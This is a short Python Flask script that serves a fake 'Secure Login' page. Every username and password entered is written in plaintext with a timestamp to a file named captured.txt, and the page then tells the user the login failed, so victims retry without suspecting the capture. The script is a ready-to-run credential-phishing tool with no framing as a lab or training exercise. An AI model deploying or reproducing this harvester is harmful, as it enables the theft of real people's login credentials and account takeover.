from flask import Flask, request, render_template_string
from datetime import datetime

app = Flask(__name__)

login_form = '''
<!doctype html>
<title>Login</title>
<h2>Secure Login</h2>
<form method="POST">
  <label>Username:</label><input name="username" type="text"><br>
  <label>Password:</label><input name="password" type="password"><br>
  <input type="submit" value="Login">
</form>
'''

@app.route('/', methods=['GET', 'POST'])
def login():
  if request.method == 'POST':
   username = request.form['username']
   password = request.form['password']
   with open('captured.txt', 'a') as f:
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    f.write(f"[{timestamp}] Username: {username}, Password: {password}\n")
   return "<h3>Login failed. Please try again.</h3>"
  return render_template_string(login_form)

if __name__ == '__main__':
  app.run(host='0.0.0.0', port=5000)
